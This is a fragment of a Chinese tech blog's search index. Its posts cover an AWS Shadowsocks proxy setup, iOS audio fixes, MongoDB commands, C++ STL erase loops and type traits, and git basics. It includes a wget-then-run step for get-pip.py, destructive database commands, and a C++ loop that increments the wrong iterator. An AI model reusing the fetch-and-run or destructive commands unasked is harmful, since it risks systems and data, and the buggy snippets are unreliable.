levon\n```\n","tags":["git"],"categories":["git"]},{"title":"aws搭建shadowsocks梯子翻墙","url":"%2Fp%2F934b1a1.html","content":"\n### 部署aws\n1. aws免费1年,申请的时候需要信用卡,没有信用卡的可以淘宝购买虚拟信用卡\n\n2. 申请成功,创建Ec2实例, 下载私钥, 注意保存好\n3. ssh连接aws, 因为淘宝购买的信用卡只能在美国2个地区部署, 中国连接会发现特别卡顿, 可以用mosh连接,后面我会写怎么使用mosh连接\n```\nchmod 400 aws.pem\nssh -i \"aws.pem\" ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com\n```\n4. 修改root密码\n```\nsudo passwd root\n```\n<!-- more -->\n-------\n\n### 安装shadowsocks\n\n1. 更新apt-get\n```\n apt-get update\n apt-get install python-pip //安装python-pip\n```\n\n2. 安装python-pip:\n```\nsudo apt-get purge python-pip\nwget https://bootstrap.pypa.io/get-pip.py\npython get-pip.py\nhash -r\n```\n3. 安装shadowsocks\n```\npip install shadowsocks // 安装shadowsocks\nssserver -c /etc/shadowsocks.json -d start //启动shadowsocks\n```\n4. 配置shadowsocks\nshadowsocks.json需要自己创建，默认是没有的 注意端口修改的是server_port, local_port是固定的\n```\n{\n  \"server\": \"0.0.0.0\",\n  \"server_port\": 6789,\n  \"local_address\": \"127.0.0.1\",\n  \"local_port\": 1080,\n  \"password\": \"******\",\n  \"timeout\": 300,\n  \"method\": \"aes-256-cfb\",\n  \"fast_open\": false,\n  \"workers\": 1\n}\n```\n配置以后重启shadowsocks:\n```\nsudo ssserver -c /etc/shadowsocks.json -d restart\n```\n\n\n### 配置aws和使用shadowsocks翻墙\n\n安装之后，添加服务器，地址为AWS的外网地址，登录AWS控制台，查看正在运行中的实例，找到公有ip。 端口号为刚才配置Shadowsocks服务器时的端口号，密码也是刚才配置的，设置完之后保存。\n\n![id1](aws搭建shadowsocks梯子翻墙/1.png)\n\n\n配置好shaodowsocks后，还需要将配置中的端口打开,这样客户端的服务才能链接得上EC2中的shadowsocks服务\n首先打开正在运行的实例，向右滚动表格，最后一项，安全组，点击进入，编辑入站规则，默认是开启了一个22端口（这是给ssh访问的）\n\n![id2](aws搭建shadowsocks梯子翻墙/2.png)\n\n\n>如果不放心流量超限的话可以设置下账单报警。\n\n","tags":["aws"],"categories":["科学上网"]},{"title":"iOS录音遇到的问题","url":"%2Fp%2F9ecea432.html","content":"### iOS使用openAL控制声音的输出设备\n项目中播放ios录音的时候使用的是AVAudio相关库, 播放音效又是用的openAL.\n如果同时或交替播放这两类声音, 会造成声音一会从听筒发声,一会从扬声器发声.\n千辛万苦找到解决方案:\n\n```cpp\nInteresting enough, it can be done!\n\nBasically you add a property listener to get route change events:\n    AudioSessionAddPropertyListener(kAudioSessionProperty_AudioRouteChange, audioRouteChangeListenerCallback,0);\n\n\tThen in the callback, determine if its a headphone being plugged-in and override the audio route:\n\t        UInt32 audioRouteOverride = kAudioSessionOverrideAudioRoute_Speaker;\n\t\t\t        AudioSessionSetProperty(kAudioSessionProperty_OverrideAudioRoute, sizeof(audioRouteOverride), &audioRouteOverride);\n\n\t\t\t\t\tToo simple...\n```\n\n\n### iOS AVAudioSession 监听静音开关\n录音使用AVAudioSession播放的时候, 无法识别Iphone手机的物理静音开关,需要修改下模式\n\n\n```\n[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryPlayback error:nil];\n```\n\n修改成\n        \n```\n[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategorySoloAmbient error:nil];//监听静音\n```\n\n\n\n","tags":["ios"],"categories":["ios"]},{"title":"mongodb操作教程","url":"%2Fp%2Fd34774ef.html","content":"\n\n### 数据库操作\n\n+ 创建数据库\n\n```\nuse study\n```\n\n如果你想查看所有数据库，可以使用 show dbs 命令：\n刚创建的数据库并不在数据库的列表中， 要显示它，我们需要向 数据库插入一些数据。\n\n+ 查看当前在哪个数据库\n\n```\n> db\nstudy\n```\n<!-- more -->\n+ 删除数据库\n\n```\ndb.dropDatabase()\n```\n<!-- more -->\n### 文档操作\n\n+ 向文档插入东西\n\n```\ndb.test.insert({\"name\":\"test\"})\n```\n\n+ 查询文档内容\n\n```\n> db.test.find()\n{ \"_id\" : ObjectId(\"58da1f0e767a1e8a0cedff28\"), \"name\" : \"test\" }\n\ndb.test.find().pretty() //格式化输出\n```\n\n+ 删除文档(注意这个删掉, remove是删除数据)\n\n```\ndb.test.drop()\n```\n\n\n+ 显示文档\n\n```\n> show tables;\nsystem.indexes\ntest\n```\n\n+ 更新文档\n\n```\ndb.collection.update(\n   <query>,\n   <update>,\n   {\n     upsert: <boolean>,\n     multi: <boolean>,\n     writeConcern: <document>\n   }\n)\n\n参数说明：\n  ● query : update的查询条件，类似sql update查询内where后面的。\n  ● update : update的对象和一些更新的操作符（如$,$inc...）等，也可以理解为sql update查询内set后面的\n  ● upsert : 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。\n  ● multi : 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。\n  ● writeConcern :可选，抛出异常的级别\n```\n\n例子:\n\n```\ndb.col.insert({\n    title: 'MongoDB 教程', \n    description: 'MongoDB 是一个 Nosql 数据库',\n    tags: ['mongodb', 'database', 'NoSQL'],\n    likes: 100\n})\n\ndb.col.update({'title':'MongoDB 教程'},{$set:{'title':'MongoDB'}})\ndb.col.update({'title':'MongoDB 教程'},{$set:{'title':'MongoDB'}},{multi:true})\n```\n\n>更多实例:\n\n```\n只更新第一条记录：\ndb.col.update( { \"count\" : { $gt : 1 } } , { $set : { \"test2\" : \"OK\"} } );\n全部更新：\ndb.col.update( { \"count\" : { $gt : 3 } } , { $set : { \"test2\" : \"OK\"} },false,true );\n只添加第一条：\ndb.col.update( { \"count\" : { $gt : 4 } } , { $set : { \"test5\" : \"OK\"} },true,false );\n全部添加加进去:\ndb.col.update( { \"count\" : { $gt : 5 } } , { $set : { \"test5\" : \"OK\"} },true,true );\n全部更新：\ndb.col.update( { \"count\" : { $gt : 15 } } , { $inc : { \"count\" : 1} },false,true );\n只更新第一条记录：\ndb.col.update( { \"count\" : { $gt : 10 } } , { $inc : { \"count\" : 1} },false,false );\n```\n\n+ save文档\n\n```\ndb.collection.save(\n   <document>,\n   {\n     writeConcern: <document>\n   }\n)\n  ● document : 文档数据。\n  ● writeConcern :可选，抛出异常的级别。\n\n以下实例中我们替换了 _id 为 56064f89ade2f21f36b03136 的文档数据： (通过指定id替换文档)\ndb.col.save({\n    \"_id\" : ObjectId(\"56064f89ade2f21f36b03136\"),\n    \"title\" : \"MongoDB\",\n    \"description\" : \"MongoDB 是一个 Nosql 数据库\",\n    \"tags\" : [\n            \"mongodb\",\n            \"NoSQL\"\n    ],\n    \"likes\" : 110\n})\n```\n\n+ remove 文档\n\n```\ndb.collection.remove(\n   <query>,\n   {\n     justOne: <boolean>,\n     writeConcern: <document>\n   }\n)\n  ● query :（可选）删除的文档的条件。\n  ● justOne : （可选）如果设为 true 或 1，则只删除一个文档。\n  ● writeConcern :（可选）抛出异常的级别。\n```\n\n如果你想删除所有数据，可以使用以下方式（类似常规 SQL 的 truncate 命令）：\n\n```\n>db.col.remove({})\n>db.col.find()\n>\n```\n\n\n\n### 文档查询\nMongoDB 与 RDBMS Where 语句比较\n如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：\n\n```\n操作 格式 范例 RDBMS中的类似语句\n等于 {<key>:<value>} db.col.find({\"by\":\"菜鸟教程\"}).pretty() where by = '菜鸟教程'\n小于 {<key>:{$lt:<value>}} db.col.find({\"likes\":{$lt:50}}).pretty() where likes < 50\n小于或等于 {<key>:{$lte:<value>}} db.col.find({\"likes\":{$lte:50}}).pretty() where likes <= 50\n大于 {<key>:{$gt:<value>}} db.col.find({\"likes\":{$gt:50}}).pretty() where likes > 50\n大于或等于 {<key>:{$gte:<value>}} db.col.find({\"likes\":{$gte:50}}).pretty() where likes >= 50\n不等于 {<key>:{$ne:<value>}} db.col.find({\"likes\":{$ne:50}}).pretty() where likes != 50\n```\n\n+ MongoDB AND 条件\nMongoDB 的 find() 方法可以传入多个键(key)，每个键(key)以逗号隔开，及常规 SQL 的 AND 条件。\n语法格式如下：\n\n```\n>db.col.find({key1:value1, key2:value2}).pretty()\n```\n\n+ MongoDB OR 条件\nMongoDB OR 条件语句使用了关键字 $or,语法格式如下：\n\n```\n>db.col.find(\n   {\n      $or: [\n\t     {key1: value1}, {key2:value2}\n      ]\n   }\n).pretty()\n```\n\n+ AND 和 OR 联合使用\n以下实例演示了 AND 和 OR 联合使用，类似常规 SQL 语句为： 'where likes>50 AND (by = '菜鸟教程' OR title = 'MongoDB 教程')'\n\n```\n>db.col.find({\"likes\": {$gt:50}, $or: [{\"by\": \"菜鸟教程\"},{\"title\": \"MongoDB 教程\"}]}).pretty()\n```\n\n\n### 操作符- $type 实例\n\n```\n类型 数字 备注\nDouble 1 \nString 2 \nObject 3 \nArray 4 \nBinary data 5 \nUndefined 6 已废弃。\nObject id 7 \nBoolean 8 \nDate 9 \nNull 10 \nRegular Expression 11 \nJavaScript 13 \nSymbol 14 \nJavaScript (with scope) 15 \n32-bit integer 16 \nTimestamp 17 \n64-bit integer 18 \nMin key 255 Query with -1.\nMax key 127 \n```\n\n如果想获取 \"col\" 集合中 title 为 String 的数据，你可以使用以下命令：\n\n```\ndb.col.find({\"title\" : {$type : 2}})\n```\n\n+ Limit()方法  \n如果你需要在MongoDB中读取指定数量的数据记录，可以使用MongoDB的Limit方法，limit()方法接受一个数字参数，该参数指定从MongoDB中读取的记录条数。\n\nlimit()方法基本语法如下所示：\n\n```\n>db.COLLECTION_NAME.find().limit(NUMBER)\n```\n\n+ Skip() 方法\n\n我们除了可以使用limit()方法来读取指定数量的数据外，还可以使用skip()方法来跳过指定数量的数据，skip方法同样接受一个数字参数作为跳过的记录条数。\n\nskip() 方法脚本语法格式如下：\n\n```\n>db.COLLECTION_NAME.find().limit(NUMBER).skip(NUMBER)\n```\n\n看下面的这个例子, 说明find没有条件, 结果后面字段显示title, _id不显示, \n\n```\n>db.col.find({},{\"title\":1,_id:0}).limit(1).skip(1)\n{ \"title\" : \"Java 教程\" }\n>\n```\n\n\n+ Sort()方法\n在MongoDB中使用使用sort()方法对数据进行排序，sort()方法可以通过参数指定排序的字段，并使用 1 和 -1 来指定排序的方式，其中 1 为升序排列，而-1是用于降序排列。\n\n\nsort()方法基本语法如下所示：\n\n```\n>db.COLLECTION_NAME.find().sort({KEY:1})\n```\n\n```\n>db.col.find({},{\"title\":1,_id:0}).sort({\"likes\":-1})\n{ \"title\" : \"PHP 教程\" }\n{ \"title\" : \"Java 教程\" }\n{ \"title\" : \"MongoDB 教程\" }\n>\n```\n\n### 索引:\nensureIndex() 方法\nensureIndex()方法基本语法格式如下所示：\n\n```\n>db.COLLECTION_NAME.ensureIndex({KEY:1})\n```\n语法中 Key 值为你要创建的索引字段，1为指定按升序创建索引，如果你想按降序来创建索引指定为-1即可。\n\nensureIndex() 方法中你也可以设置使用多个字段创建索引（关系型数据库中称作复合索引）。\n\n```\n>db.col.ensureIndex({\"title\":1,\"description\":-1})\n>\n```\n\nensureIndex() 接收可选参数，可选参数列表如下：\n\n```\nParameter Type Description\nbackground Boolean 建索引过程会阻塞其它数据库操作，background可指定以后台方式创建索引，即增加 \"background\" 可选参数。 \"background\" 默认值为false。\nunique Boolean 建立的索引是否唯一。指定为true创建唯一索引。默认值为false.\nname string 索引的名称。如果未指定，MongoDB的通过连接索引的字段名和排序顺序生成一个索引名称。\ndropDups Boolean 在建立唯一索引时是否删除重复记录,指定 true 创建唯一索引。默认值为 false.\nsparse Boolean 对文档中不存在的字段数据不启用索引；这个参数需要特别注意，如果设置为true的话，在索引字段中不会查询出不包含对应字段的文档.。默认值为 false.\nexpireAfterSeconds integer 指定一个以秒为单位的数值，完成 TTL设定，设定集合的生存时间。\nv index version 索引的版本号。默认的索引版本取决于mongod创建索引时运行的版本。\nweights document 索引权重值，数值在 1 到 99,999 之间，表示该索引相对于其他索引字段的得分权重。\ndefault_language string 对于文本索引，该参数决定了停用词及词干和词器的规则的列表。 默认为英语\nlanguage_override string 对于文本索引，该参数指定了包含在文档中的字段名，语言覆盖默认的language，默认值为 language.\n```\n\n\n在后台创建索引：\n\n```\ndb.values.ensureIndex({open: 1, close: 1}, {background: true})\n```\n通过在创建索引时加background:true 的选项，让创建工作在后台执行\n\n\n\n### 聚合:\nMongoDB中聚合(aggregate)主要用于处理数据(诸如统计平均值,求和等)，并返回计算后的数据结果。有点类似sql语句中的 count(*)。\n\naggregate() 方法的基本语法格式如下所示：\n\n```\n>db.COLLECTION_NAME.aggregate(AGGREGATE_OPERATION)\n```\n\n```\n> db.col.find().pretty()\n{\n\t\"_id\" : ObjectId(\"58dc7efc70d2b5b8821b6184\"),\n\t\"title\" : \"MongoDB Overview\",\n\t\"description\" : \"MongoDB is no sql database\",\n\t\"by_user\" : \"w3cschool.cc\",\n\t\"url\" : \"http://www.w3cschool.cc\",\n\t\"tags\" : [\n\t\t\"mongodb\",\n\t\t\"database\",\n\t\t\"NoSQL\"\n\t],\n\t\"likes\" : 100\n}\n{\n\t\"_id\" : ObjectId(\"58dc7fcb70d2b5b8821b6185\"),\n\t\"title\" : \"NoSQL Overview\",\n\t\"description\" : \"No sql database is very fast\",\n\t\"by_user\" : \"w3cschool.cc\",\n\t\"url\" : \"http://www.w3cschool.cc\",\n\t\"tags\" : [\n\t\t\"mongodb\",\n\t\t\"database\",\n\t\t\"NoSQL\"\n\t],\n\t\"likes\" : 10\n}\n{\n\t\"_id\" : ObjectId(\"58dc7fe370d2b5b8821b6186\"),\n\t\"title\" : \"Neo4j Overview\",\n\t\"description\" : \"Neo4j is no sql database\",\n\t\"by_user\" : \"Neo4j\",\n\t\"url\" : \"http://www.neo4j.com\",\n\t\"tags\" : [\n\t\t\"neo4j\",\n\t\t\"database\",\n\t\t\"NoSQL\"\n\t],\n\t\"likes\" : 750\n}\n```\n\n```\n> db.col.aggregate([{$group:{_id:\"$by_user\", num_tutorial:{$sum:1}}}])\n{ \"_id\" : \"Neo4j\", \"num_tutorial\" : 1 }\n{ \"_id\" : \"w3cschool.cc\", \"num_tutorial\" : 2 }\n>\n```\n以上实例类似sql语句： select by_user, count(*) from mycol group by by_user\n\n//上面的_id不能变, 后面的字段可以自己指定\n\n下表展示了一些聚合的表达式:\n\n```\n表达式 描述 实例\n$sum 计算总和。 db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$sum : \"$likes\"}}}])\n$avg 计算平均值 db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$avg : \"$likes\"}}}])\n$min 获取集合中所有文档对应值得最小值。 db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$min : \"$likes\"}}}])\n$max 获取集合中所有文档对应值得最大值。 db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$max : \"$likes\"}}}])\n$push 在结果文档中插入值到一个数组中。 db.mycol.aggregate([{$group : {_id : \"$by_user\", url : {$push: \"$url\"}}}])\n$addToSet 在结果文档中插入值到一个数组中，但不创建副本。 db.mycol.aggregate([{$group : {_id : \"$by_user\", url : {$addToSet : \"$url\"}}}])\n$first 根据资源文档的排序获取第一个文档数据。 db.mycol.aggregate([{$group : {_id : \"$by_user\", first_url : {$first : \"$url\"}}}])\n$last 根据资源文档的排序获取最后一个文档数据 db.mycol.aggregate([{$group : {_id : \"$by_user\", last_url : {$last : \"$url\"}}}])\n```\n\n\n### 管道\n\n  ● $project：修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档。\n\n  ● $match：用于过滤数据，只输出符合条件的文档。$match使用MongoDB的标准查询操作。\n\n  ● $limit：用来限制MongoDB聚合管道返回的文档数。\n\n  ● $skip：在聚合管道中跳过指定数量的文档，并返回余下的文档。\n\n  ● $unwind：将文档中的某一个数组类型字段拆分成多条，每条包含数组中的一个值。\n\n  ● $group：将集合中的文档分组，可用于统计结果。\n\n  ● $sort：将输入文档排序后输出。\n\n  ● $geoNear：输出接近某一地理位置的有序文档。\n\n\n1、$project实例\n\n```\ndb.article.aggregate(\n    { $project : {\n        title : 1 ,\n        author : 1 ,\n    }}\n );\n```\n这样的话结果中就只还有_id,tilte和author三个字段了，默认情况下_id字段是被包含的，如果要想不包含_id话可以这样:\n\n```\ndb.article.aggregate(\n    { $project : {\n        _id : 0 ,\n        title : 1 ,\n        author : 1\n    }});\n```\n```\n> db.article.find()\n{ \"_id\" : ObjectId(\"58dca39270d2b5b8821b6187\"), \"name\" : \"liuwei\", \"age\" : 123 }\n> db.article.aggregate(     { $project : {      name:1    }}  );\n{ \"_id\" : ObjectId(\"58dca39270d2b5b8821b6187\"), \"name\" : \"liuwei\" }\n> db.article.find({}, {name:1})\n{ \"_id\" : ObjectId(\"58dca39270d2b5b8821b6187\"), \"name\" : \"liuwei\" }\n```\n2.$match实例\n\n```\ndb.articles.aggregate( [\n                        { $match : { score : { $gt : 70, $lte : 90 } } },\n                        { $group: { _id: null, count: { $sum: 1 } } }\n                       ] );\n```\n$match用于获取分数大于70小于或等于90记录，然后将符合条件的记录送到下一阶段$group管道操作符进行处理。\n\n3.$skip实例\n\n```\ndb.article.aggregate(\n    { $skip : 5 });\n```\n经过$skip管道操作符处理后，前五个文档被\"过滤\"掉。\n\n\n### 数据库引用:\n\nDBRef的形式：\n\n```\n{ $ref : , $id : , $db :  }\n三个字段表示的意义为：\n  ● $ref：集合名称\n  ● $id：引用的id\n  ● $db:数据库名称，可选参数\n```\n\naddress DBRef 字段指定了引用的地址文档是在 address_home 集合下的 w3cschoolcc 数据库，id 为 534009e4d852427820000002。\n以下代码中，我们通过指定 $ref 参数（address_home 集合）来查找集合中指定id的用户地址信息：\n\n```\n>var user = db.users.findOne({\"name\":\"Tom Benzamin\"})\n>var dbRef = user.address\n>db[dbRef.$ref].findOne({\"_id\":(dbRef.$id)})\n```\n\n\n### 使用 explain()\nexplain 操作提供了查询信息，使用索引及查询统计等。有利于我们对索引的优化。\n接下来我们在 users 集合中创建 gender 和 user_name 的索引：\n\n```\ndb.users.find({gender:\"M\"},{user_name:1,_id:0}).explain()\n```\n\n\n### 使用 hint()\n虽然MongoDB查询优化器一般工作的很不错，但是也可以使用 hint 来强制 MongoDB 使用一个指定的索引。\n这种方法某些情形下会提升性能。 一个有索引的 collection 并且执行一个多字段的查询(一些字段已经索引了)。\n如下查询实例指定了使用 gender 和 user_name 索引字段来查询：\n\n```\n>db.users.find({gender:\"M\"},{user_name:1,_id:0}).hint({gender:1,user_name:1})\n```\n\n","tags":["mongodb"],"categories":["sql"]},{"title":"c++stl容器循环earse用法","url":"%2Fp%2F6556ac6a.html","content":"\n### vector deque\n在使用 vector、deque遍历删除元素时，也可以通过erase的返回值来获取下一个元素的位置：\n\n```\n      std::vector< int> Vec;\n      std::vector< int>::iterator itVec;\n      for( itVec = Vec.begin(); itVec != Vec.end(); )\n      {\n            if( WillDelete( *itVec) )\n            {\n                 itVec = Vec.erase( itVec);\n            }\n            else\n               itList++;\n      }\n```\n<!-- more -->\n\n### list set map \n在 使用 list、set 或 map遍历删除某些元素时可以这样使用：\n\n```\n      std::list< int> List;\n      std::list< int>::iterator itList;\n      for( itList = List.begin(); itList != List.end(); )\n      {\n            if( WillDelete( *itList) )\n            {\n               itList = List.erase( itList);\n            }\n            else\n               itList++;\n      }\n```\n\n\n```\n      std::list< int> List;\n      std::list< int>::iterator itList;\n      for( itList = List.begin(); itList != List.end(); )\n      {\n            if( WillDelete( *itList) )\n            {\n               List.erase( itList++);\n            }\n            else\n               itList++;\n      }\n```\n","tags":["c++"],"categories":["c++"]},{"title":"c++11的模板类型判断std::is_same和std::decay","url":"%2Fp%2F1e4be646.html","content":"\n问题提出：有一个模板函数，函数在处理int型和double型时需要进行特殊的处理，那么怎么在编译期知道传入的参数的数据类型是int型还是double型呢？ \n如：\n\n\n```cpp\n#include <iostream>\ntemplate <typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    //do something check data type\n\t//std::cout<< out put the type\n}\n```\n\n这里就需要用到C++11的type_traits头文件了，type_traits头文件定义了很多类型检查相关的方法，上面的例子具体用到了其中两个结构：\n\n## std::is_same 判断类型是否一致\n\n位于头文件`<type_traits>`中\n这个结构体作用很简单，就是两个一样的类型会返回true\n\n```cpp\nbool isInt = std::is_same<int, int>::value; //为true\n```\n\n下面是官方的例子：\n\n```cpp\n#include <iostream>\n#include <type_traits>\n#include <cstdint>\n\nvoid print_separator()\n{\n    std::cout << \"-----\\n\";\n}\n\nint main()\n{\n    std::cout << std::boolalpha;\n\n    std::cout << std::is_same<int, int32_t>::value << '\\n';   // true\n    std::cout << std::is_same<int, int64_t>::value << '\\n';   // false\n    std::cout << std::is_same<float, int32_t>::value << '\\n'; // false\n\n    print_separator();\n\n    std::cout << std::is_same<int, int>::value << \"\\n\";          // true\n    std::cout << std::is_same<int, unsigned int>::value << \"\\n\"; // false\n    std::cout << std::is_same<int, signed int>::value << \"\\n\";   // true\n\n    print_separator();\n\n    // unlike other types 'char' is not 'unsigned' and not 'signed'\n    std::cout << std::is_same<char, char>::value << \"\\n\";          // true\n    std::cout << std::is_same<char, unsigned char>::value << \"\\n\"; // false\n    std::cout << std::is_same<char, signed char>::value << \"\\n\";   // false\n}\n```\n\n通过std::is_same即可判断两个类型是否一样，特别在模板里面，在不清楚模板的参数时，此功能可以对一些特定的参数类型进行特殊的处理。\n\n<!-- more -->\n\n> 这里说个题外话，大家是否通过std::is_same发现，char既不是unsigned char也不是signed char，char就是char，这和int是signed int的缩写是不一样的，char的表达范围可能等同于signed char，也可能等同于unsigned char，取决于编译器，一般是等同于signed char，但这个仅仅是范围等同，就像32位上int和long范围是一样的，但不是同一个类型。\n> \n> 因为用途不同，char用于表达字符，理论上不应该关心其正负的实现，而signed char 和 unsigned char 用于表达数值，或可移植的char。\n\n\n回到正文，std::is_same可以判断两种类似是否一样，那么用在模板里就是利器了，本位一开始提到的那个问题就可以这样写：\n\n```cpp\n#include <iostream>\ntemplate<typename TYPE>\ntypeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\";\n        //do something int \n    }\n    else\n    {\n        //.........\n    }\n}\n```\n\n看似很美好，再看一个示例：\n\n```cpp\n// is_same example\n#include <iostream>\n#include <type_traits>\n#include <cstdint>\n\ntypedef int integer_type;\nstruct A { int x,y; };\nstruct B { int x,y; };\ntypedef A C;\n\nint main() {\n      std::cout << std::boolalpha;\n      std::cout << \"is_same:\" << std::endl;\n      std::cout << \"int, const int: \" << std::is_same<int, const int>::value << std::endl;//false\n      std::cout << \"int, int&: \" << std::is_same<int, int&>::value << std::endl;//false\n      std::cout << \"int, const int&: \" << std::is_same<int, const int&>::value << std::endl;//false\n      std::cout << \"int, integer_type: \" << std::is_same<int, integer_type>::value << std::endl;//true\n      std::cout << \"A, B: \" << std::is_same<A,B>::value << std::endl;//false\n      std::cout << \"A, C: \" << std::is_same<A,C>::value << std::endl;//true\n      std::cout << \"signed char, std::int8_t: \" << std::is_same<signed char,std::int8_t>::value << std::endl;//true\n      return 0;\n}\n```\n输出：\n\n```cpp\nis_same:\nint, const int: false\nint, int&: false\nint, const int&: false\nint, integer_type: true\nA, B: false\nA, C: true\nsigned char, std::int8_t: true\n```\n\n可以发现std::is_same的判断是很严格的,再看下面的一个例子：\n\n```cpp\n#include <stdlib.h>\n#include <iostream>\n#include <type_traits>\n\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n    const int& e = d[7];\n    typeCheck(a);//int type\n    typeCheck(b);//int type\n    typeCheck(c);//int type\n    typeCheck(d[7]);//int type\n    typeCheck(e);//int type\n    typeCheck(8);//int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else if(std::is_same<TYPE,std::string>::value)\n    {\n        std::cout<<\"string type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\";\n    }\n}\n```\n输出：\n\n```cpp\nint type\nint type\nint type\nint type\nint type\nint type\n```\n\n测试后发现，虽然变量b,c, e使用的是引用，std::is_same那么严格为什么是int_type呢? 因为在写模板函数时，经常会强制指定const引用进行传参，以免进行数据拷贝，这时候is_same就做出了相等的判断.\n\n\n\n> 如果我们显示的指定模板参数类型时情况有不一样了：\n\n```cpp\n#include <stdlib.h>\n#include <iostream>\n#include <type_traits>\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n\n    typeCheck<int>(a);        //int type\n    typeCheck<const int&>(b);//other type\n    typeCheck<int &>(c);        //other type\n    typeCheck<const int&>(d[7]);//other type\n    typeCheck(8);                //int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else if(std::is_same<TYPE,std::string>::value)\n    {\n        std::cout<<\"string type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\";\n    }\n}\n```\n输出：\n\n```cpp\nint type\nother type\nother type\nother type\nint type\n```\n瞬间结果就不一样了，这很好了解，从上面可知道，std::is_same对int\\ const int\\ int &\\ const int& 等都是区别对待的.\n\n\n> 但是有时候其实我们还是希望TYPE和const TYPE& 是能认为是一样的，这时就需要std::decay进行退化处理\n\n\n## std::decay 退化类型的修饰\n\nstd::decay就是对一个类型进行退化处理，他的实现如下:\n\n```cpp\ntemplate< class T >\nstruct decay {\nprivate:\n    typedef typename std::remove_reference<T>::type U;\npublic:\n    typedef typename std::conditional< \n        std::is_array<U>::value,\n        typename std::remove_extent<U>::type*,\n        typename std::conditional< \n            std::is_function<U>::value,\n            typename std::add_pointer<U>::type,\n            typename std::remove_cv<U>::type\n        >::type\n    >::type type;\n};\n```\n看着比较抽象，其实就是把各种引用啊什么的修饰去掉，把cosnt int&退化为int，这样就能通过std::is_same正确识别出加了引用的类型了 \n上面的例子改为：\n\n```cpp\n#include <iostream>\n#include <type_traits>\n\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n\n    typeCheck<int>(a);//int type\n    typeCheck<const int&>(b);//int type\n    typeCheck<int &>(c);//int type\n    typeCheck<const int&>(d[7]);//int type\n    typeCheck(8);//int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<typename std::decay<TYPE>::type,int>::value)//c++11\n    //if(std::is_same<std::decay_t<TYPE>, int>::value)//c++14\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\"<<std::endl;\n    }\n}\n```\n\n在cppref有个更加详细的例子：\n\n```cpp\n#include <iostream>\n#include <type_traits>\n\ntemplate <typename T, typename U>\nstruct decay_equiv : \n    std::is_same<typename std::decay<T>::type, U>::type \n{};\n\nint main()\n{\n    std::cout << std::boolalpha\n              << decay_equiv<int, int>::value << '\\n'\n              << decay_equiv<int&, int>::value << '\\n'\n              << decay_equiv<int&&, int>::value << '\\n'\n              << decay_equiv<const int&, int>::value << '\\n'\n              << decay_equiv<int[2], int*>::value << '\\n'\n              << decay_equiv<int(int), int(*)(int)>::value << '\\n';\n}\n```\n\n输出:\n\n```cpp\ntrue\ntrue\ntrue\ntrue\ntrue\ntrue\n```\n\n## 总结：\n+ 在模板里可以通过std::is_same判断模板的类型，从而实现对不同类型的区别对待\n\n+ 在堆类型要求不是非常严格的情况下，可以使用std::decay把类型退化为基本形态，结合std::is_same用，可以判断出更多的情况\n","tags":["c++"],"categories":["c++"]},{"title":"git实用操作总结","url":"%2Fp%2F42eae4e7.html","content":"\n### git的配置\n1. 安装git\n2. 安装完成后，需要设置自己的用户名和email，在命令行输入：\n\n```bash\ngit config --global user.name \"levon\"\ngit config --global user.email \"levonfly@gmail.com\"\n```\n\n### git和目录绑定\n1. 在一个目录里可以通过git init命令把这个目录变成Git可以管理的仓库,然后通过以下命令绑定提交的地址\n\n```bash\ngit remote add origin https://github.com/unix2dos/unix2dos.github.io\n```\n\n2. git clone 地址 就会创建目录和地址绑定\n<!-- more -->\n\n### git的基础操作\n1. 命令git add \t      把文件添加到仓库\n2. 命令git commit \t  把文件提交到仓库\n3. 命令git pull \t  把远程仓库拉取文件\n4. 命令git push       把文件提交到远程仓库\n5. 命令git log \t      查看git提交日志\n6. 如果嫌输出信息太多, 可以加上--pretty=oneline参数. 另外也可以花式log输出, git lg查看下\n\n\t```bash\n\tgit config --global alias.lg \"log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit --date=relative\"\n\t```\n7. 命令git diff 查看版本之间文件修改变化\n\n\t```bash\n\tgit diff 87b91b6 f9b3075 [--name-only]加上可以只看文件名字\n\t```\n\n### git 回滚版本\n在Git中，用HEAD表示当前版本,上一个版本就是HEAD^,上上一个版本就是HEAD^^,当然往上100个版本写100个^比较容易数不过来，所以写成HEAD~100。\n\n1. 回滚到上一个版本\n```bash\ngit reset --hard HEAD^\n```\n2. 回滚到任意一个版本\n```bash\ngit reset --hard 版本号(通过git log查看)\n```\n3. 如果git回滚到历史版本后, git log只能看历史版本再以前的版本号, 不到未来的版本号怎么办?\n>git 提供了一个命令git 